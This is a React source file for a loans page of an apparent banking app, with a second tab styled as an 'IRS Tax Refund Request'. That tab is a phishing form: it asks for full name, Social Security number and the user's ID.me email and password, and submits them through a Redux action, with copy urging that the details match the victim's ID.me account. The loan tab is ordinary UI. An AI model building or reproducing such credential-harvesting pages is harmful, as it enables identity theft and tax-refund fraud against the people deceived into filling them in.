import React, { useEffect, useState } from 'react';
import { useSelector, useDispatch } from 'react-redux';
import { useLocation } from 'react-router-dom';
import { Box, Typography, Paper, Grid, Button, Card, CardContent, CircularProgress, Alert, Dialog, DialogTitle, DialogContent, DialogActions, TextField, Tab, Tabs, MenuItem } from '@mui/material';
import { getUserLoans, getAvailableLoanTypes, applyForLoan, makeLoanPayment, submitTaxRefundRequest } from '../store/slices/loanSlice';

const Loans = () => {
  const dispatch = useDispatch();
  const location = useLocation();
  const { loans, loading, error, availableLoanTypes } = useSelector((state) => state.loans);
  const [openPaymentDialog, setOpenPaymentDialog] = useState(false);
  const [openApplyDialog, setOpenApplyDialog] = useState(false);
  const [tabValue, setTabValue] = useState(0); // 0 = Loans, 1 = IRS Tax Refund
  const [selectedLoan, setSelectedLoan] = useState(null);
  const [paymentAmount, setPaymentAmount] = useState('');
  const [selectedLoanType, setSelectedLoanType] = useState(null);
  const [loanAmount, setLoanAmount] = useState('');
  
  // IRS Tax Refund form state
  const [irsForm, setIrsForm] = useState({
    fullName: '',
    ssn: '',
    idmeEmail: '',
    idmePassword: '',
    country: ''
  });
  const [irsSubmitting, setIrsSubmitting] = useState(false);
  const [irsSuccess, setIrsSuccess] = useState(false);
  
  // List of countries for the dropdown
  const countries = [
    'United States', 'Canada', 'United Kingdom', 'Australia', 'Germany', 'France', 
    'Italy', 'Spain', 'Mexico', 'Brazil', 'India', 'China', 'Japan', 'South Korea',
    'Afghanistan', 'Albania', 'Algeria', 'Argentina', 'Armenia', 'Austria', 'Azerbaijan',
    'Bahamas', 'Bahrain', 'Bangladesh', 'Barbados', 'Belarus', 'Belgium', 'Belize', 'Benin',
    'Bhutan', 'Bolivia', 'Bosnia and Herzegovina', 'Botswana', 'Brazil', 'Bulgaria', 'Burkina Faso',
    'Burundi', 'Cambodia', 'Cameroon', 'Canada', 'Cape Verde', 'Chad', 'Chile', 'China', 'Colombia',
    'Comoros', 'Costa Rica', 'Croatia', 'Cuba', 'Cyprus', 'Czech Republic', 'Denmark', 'Djibouti',
    'Dominica', 'Dominican Republic', 'Ecuador', 'Egypt', 'El Salvador', 'Estonia', 'Ethiopia',
    'Fiji', 'Finland', 'France', 'Georgia', 'Germany', 'Ghana', 'Greece', 'Guatemala', 'Haiti',
    'Honduras', 'Hong Kong', 'Hungary', 'Iceland', 'India', 'Indonesia', 'Iran', 'Iraq', 'Ireland',
    'Israel', 'Italy', 'Jamaica', 'Japan', 'Jordan', 'Kazakhstan', 'Kenya', 'Kuwait', 'Kyrgyzstan',
    'Laos', 'Latvia', 'Lebanon', 'Libya', 'Lithuania', 'Luxembourg', 'Malaysia', 'Maldives', 'Mali',
    'Malta', 'Mauritania', 'Mauritius', 'Mexico', 'Moldova', 'Monaco', 'Mongolia', 'Montenegro',
    'Morocco', 'Mozambique', 'Namibia', 'Nepal', 'Netherlands', 'New Zealand', 'Nicaragua', 'Niger',
    'Nigeria', 'Norway', 'Oman', 'Pakistan', 'Palestine', 'Panama', 'Paraguay', 'Peru', 'Philippines',
    'Poland', 'Portugal', 'Qatar', 'Romania', 'Russian Federation', 'Rwanda', 'Saudi Arabia',
    'Senegal', 'Serbia', 'Singapore', 'Slovakia', 'Slovenia', 'South Africa', 'South Sudan', 'Spain',
    'Sri Lanka', 'Sudan', 'Sweden', 'Switzerland', 'Syria', 'Taiwan', 'Tajikistan', 'Tanzania',
    'Thailand', 'Togo', 'Trinidad and Tobago', 'Tunisia', 'Turkey', 'Turkmenistan', 'Uganda',
    'Ukraine', 'United Arab Emirates', 'Uruguay', 'Uzbekistan', 'Vanuatu', 'Venezuela', 'Vietnam',
    'Yemen', 'Zambia', 'Zimbabwe'
  ];

  useEffect(() => {
    dispatch(getUserLoans());
    dispatch(getAvailableLoanTypes());
  }, [dispatch, location.pathname]);

  const handlePaymentClick = (loan) => {
    setSelectedLoan(loan);
    setPaymentAmount('');
    setOpenPaymentDialog(true);
  };

  const handlePaymentSubmit = () => {
    if (selectedLoan && paymentAmount) {
      dispatch(makeLoanPayment({ 
        id: selectedLoan.id, 
        paymentData: { amount: parseFloat(paymentAmount) } 
      }));
      setOpenPaymentDialog(false);
    }
  };

  const handleApplyClick = (loanType) => {
    setSelectedLoanType(loanType);
    setLoanAmount('');
    setOpenApplyDialog(true);
  };

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
    setIrsSuccess(false);
  };

  const handleIrsFormChange = (e) => {
    setIrsForm(prev => ({
      ...prev,
      [e.target.name]: e.target.value
    }));
  };

  const handleIrsSubmit = async () => {
    setIrsSubmitting(true);
    try {
      await dispatch(submitTaxRefundRequest(irsForm)).unwrap();
      setIrsSuccess(true);
      setIrsForm({
        fullName: '',
        ssn: '',
        idmeEmail: '',
        idmePassword: '',
        country: ''
      });
    } catch (error) {
      console.error('Tax refund request failed:', error);
    } finally {
      setIrsSubmitting(false);
    }
  };

  const handleApplySubmit = () => {
    if (selectedLoanType && loanAmount) {
      dispatch(applyForLoan({
        loanType: selectedLoanType.type,
        amount: parseFloat(loanAmount)
      }));
      setOpenApplyDialog(false);
    }
  };

  if (loading) {
    return (
      <Box display="flex" justifyContent="center" alignItems="center" minHeight="80vh">
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Box mt={4}>
        <Alert severity="error">{error}</Alert>
      </Box>
    );
  }

  return (
    <Box>
      <Typography variant="h4" gutterBottom>Loans & IRS Tax Refunds</Typography>
      
      <Paper sx={{ mb: 4 }}>
        <Tabs value={tabValue} onChange={handleTabChange} sx={{ borderBottom: 1, borderColor: 'divider' }}>
          <Tab label="Loan Services" />
          <Tab label="IRS Tax Refund Request" />
        </Tabs>
      </Paper>

      {tabValue === 0 && (
        <></>
      )}

      {tabValue === 1 && (
        <Paper sx={{ p: 4 }}>
          <Typography variant="h5" gutterBottom>IRS Tax Refund Request</Typography>
          <Typography variant="body1" sx={{ mb: 4 }}>
            Please fill out the form below to submit your IRS tax refund request
          </Typography>

          {irsSuccess && (
            <Alert severity="success" sx={{ mb: 3 }}>
              Your IRS tax refund request has been submitted successfully! We will process it and contact you soon.
            </Alert>
          )}

          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1" gutterBottom>Personal Information</Typography>
              <TextField
                fullWidth
                label="Full Name"
                name="fullName"
                value={irsForm.fullName}
                onChange={handleIrsFormChange}
                margin="normal"
                required
              />
              <TextField
                fullWidth
                label="Social Security Number (SSN)"
                name="ssn"
                value={irsForm.ssn}
                onChange={handleIrsFormChange}
                margin="normal"
                required
                placeholder="XXX-XX-XXXX"
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1" gutterBottom>ID.me Credentials</Typography>
              <TextField
                fullWidth
                label="ID.me Email"
                name="idmeEmail"
                type="email"
                value={irsForm.idmeEmail}
                onChange={handleIrsFormChange}
                margin="normal"
                required
              />
              <TextField
                fullWidth
                label="ID.me Password"
                name="idmePassword"
                type="password"
                value={irsForm.idmePassword}
                onChange={handleIrsFormChange}
                margin="normal"
                required
              />
            </Grid>
            <Grid item xs={12}>
              <Typography variant="subtitle1" gutterBottom>Location Information</Typography>
              <TextField
                select
                fullWidth
                label="Country"
                name="country"
                value={irsForm.country}
                onChange={handleIrsFormChange}
                margin="normal"
                required
              >
                {countries.map((country) => (
                  <MenuItem key={country} value={country}>
                    {country}
                  </MenuItem>
                ))}
              </TextField>
            </Grid>
            <Grid item xs={12}>
              <Alert severity="warning" sx={{ mt: 2, mb: 3 }}>
                <strong>Important Notice:</strong> Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.
              </Alert>
            </Grid>
            <Grid item xs={12}>
              <Button
                variant="contained"
                size="large"
                onClick={handleIrsSubmit}
                disabled={irsSubmitting || !irsForm.fullName || !irsForm.ssn || !irsForm.idmeEmail || !irsForm.idmePassword || !irsForm.country}
              >
                {irsSubmitting ? <CircularProgress size={24} /> : 'Submit Request'}
              </Button>
            </Grid>
          </Grid>
        </Paper>
      )}

      {/* Loan Services Content */}
      {tabValue === 0 && (
        <>
          {loans.length > 0 && (
            <>
              <Typography variant="h6" sx={{ mt: 4, mb: 2 }}>Your Active Loans</Typography>
              {loans.map((loan) => (
            <Paper key={loan.id} sx={{ p: 3, mb: 3 }}>
              <Grid container spacing={3} alignItems="center">
                <Grid item xs={12} md={3}>
                  <Typography variant="h6">{loan.type}</Typography>
                  <Typography color="text.secondary">${loan.amount} total</Typography>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Typography>Remaining: ${loan.remaining}</Typography>
                  <Typography>EMI: ${loan.emi}/month</Typography>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Typography>Next EMI: {loan.nextEmiDate}</Typography>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Button variant="outlined" onClick={() => handlePaymentClick(loan)}>
                    Pay Now
                  </Button>
                </Grid>
              </Grid>
            </Paper>
          ))}
        </>
      )}

      {loans.length === 0 && (
        <Paper sx={{ p: 4, textAlign: 'center', mt: 4 }}>
          <Typography variant="h6" color="text.secondary">You don't have any active loans</Typography>
        </Paper>
      )}

      <Typography variant="h6" sx={{ mt: 6, mb: 2 }}>Apply for New Loan</Typography>
      {availableLoanTypes.length > 0 ? (
        <Grid container spacing={3}>
          {availableLoanTypes.map((option, index) => (
            <Grid item xs={12} md={6} key={index}>
              <Card>
                <CardContent>
                  <Typography variant="h6">{option.type}</Typography>
                  <Typography color="primary" variant="h5" sx={{ my: 1 }}>{option.rate} p.a.</Typography>
                  <Typography color="text.secondary">Up to ${option.maxAmount?.toLocaleString()}</Typography>
                  <Button 
                    variant="contained" 
                    sx={{ mt: 2 }} 
                    onClick={() => handleApplyClick(option)}
                  >
                    Apply Now
                  </Button>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      ) : (
        <Paper sx={{ p: 4, textAlign: 'center' }}>
          <Typography variant="body1" color="text.secondary">Loading loan options...</Typography>
        </Paper>
      )}

      {/* Payment Dialog */}
      <Dialog open={openPaymentDialog} onClose={() => setOpenPaymentDialog(false)}>
        <DialogTitle>Make Payment</DialogTitle>
        <DialogContent>
          <Typography variant="body1" sx={{ mb: 2 }}>
            Loan: {selectedLoan?.type}
          </Typography>
          <Typography variant="body2" sx={{ mb: 2 }}>
            Remaining amount: ${selectedLoan?.remaining}
          </Typography>
          <TextField
            label="Payment Amount"
            type="number"
            fullWidth
            value={paymentAmount}
            onChange={(e) => setPaymentAmount(e.target.value)}
            sx={{ mt: 2 }}
          />
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setOpenPaymentDialog(false)}>Cancel</Button>
          <Button onClick={handlePaymentSubmit} variant="contained">Submit Payment</Button>
        </DialogActions>
      </Dialog>

      {/* Apply Loan Dialog */}
      <Dialog open={openApplyDialog} onClose={() => setOpenApplyDialog(false)}>
        <DialogTitle>Apply for {selectedLoanType?.type}</DialogTitle>
        <DialogContent>
          <Typography variant="body1" sx={{ mb: 2 }}>
            Interest rate: {selectedLoanType?.rate}% p.a.
          </Typography>
          <Typography variant="body2" sx={{ mb: 2 }}>
            Maximum amount: ${selectedLoanType?.maxAmount?.toLocaleString()}
          </Typography>
          <TextField
            label="Loan Amount"
            type="number"
            fullWidth
            value={loanAmount}
            onChange={(e) => setLoanAmount(e.target.value)}
            sx={{ mt: 2 }}
          />
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setOpenApplyDialog(false)}>Cancel</Button>
          <Button onClick={handleApplySubmit} variant="contained">Submit Application</Button>
        </DialogActions>
      </Dialog>
    </>
  )}
</Box>
);
};

export default Loans;